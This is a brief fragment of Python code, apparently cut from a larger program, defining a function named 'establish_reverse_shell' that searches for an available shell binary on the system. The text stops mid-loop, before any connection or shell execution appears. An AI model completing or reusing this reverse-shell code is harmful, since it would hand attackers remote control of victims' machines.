def establish_reverse_shell(sock) -> bool:
    try:
        shells = ["/bin/bash", "/bin/sh", "/usr/bin/bash", "/usr/bin/sh"]
        shell_path = None

        for candidate in shells:
            if Path(candidate).exists():
